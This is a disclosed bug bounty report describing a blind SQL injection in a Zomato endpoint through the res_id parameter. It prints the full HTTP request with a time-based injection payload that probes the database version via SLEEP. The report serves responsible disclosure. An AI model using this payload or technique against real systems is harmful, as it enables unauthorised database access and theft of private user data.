# [www.zomato.com] Blind SQL Injection in /php/geto2banner

## Report Details
- **Report ID**: 838855
- **URL**: https://hackerone.com/reports/838855
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-04-04T14:15:36.412Z
- **Disclosed**: 2020-08-10T13:27:02.782Z

## Reporter
- **Username**: zzzhacker13
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
## Hi Team!

Our team discovered a ``Blind SQL Injection`` by Abusing LocalParams (`res_id`) in `/php/geto2banner`
**We are working to create a full PDF Report as an WriteUp ;)**

## Here is a Temporal Exploit based on the Vulnerable request:

```
POST /php/geto2banner HTTP/1.1
Host: www.zomato.com
Connection: close
Content-Length: 73
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en

res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0
```

Thank you so much!!

- As you can see in the request - we are able to **Exploit** it to **extract data from your DB**!

## Impact

## Full database access holding private user information.

## Attachments
No attachments
